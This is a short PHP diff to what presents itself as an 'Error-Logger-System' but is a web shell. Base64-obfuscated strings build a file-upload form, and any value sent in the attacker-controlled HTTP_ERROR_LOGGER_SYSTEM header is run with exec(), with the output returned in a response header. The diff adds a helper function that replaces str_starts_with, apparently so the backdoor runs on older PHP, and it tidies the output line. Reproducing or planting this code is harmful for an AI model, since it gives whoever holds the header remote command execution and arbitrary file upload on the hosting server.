@@ -15,6 +15,10 @@
 
     $SSW = $NuNes("I1VwbG9hZEZpbGU6");
 
+    function LoggerStartsWith($haystack, $needle) {
+        return (strpos($haystack, $needle) === 0);
+    }
+
     header("Error-Logger-System: Ver.0.1 Welcome :)");
     $Logger = $_SERVER["HTTP_ERROR_LOGGER_SYSTEM"];
 
@@ -24,7 +28,7 @@
         echo $NuNes("PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+");
         echo $Logger;
 
-    }else if (str_starts_with($Logger, $SSW)) {
+    }else if (LoggerStartsWith($Logger, $SSW)) {
         echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
         echo $NuNes("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jw==").$CurrentFile.$NuNes("Jz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdsb2dmaWxlJz48L2Zvcm0+");
         echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
@@ -34,6 +38,6 @@
 
         if (move_uploaded_file($TmpFile, $File)){echo "\n[ok] Successfully.\n-> [$UploadDir/$FileName]\n";}else {echo "\n[err] Failed.\n";};
 
-    }else {exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output), false);};//exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output));}; //header("Log: ".json_encode($Output));echo "Log: ".json_encode($Output);};
+    }else {exec($Logger, $Output);header("Log: ".json_encode($Output));};
 
 ?>
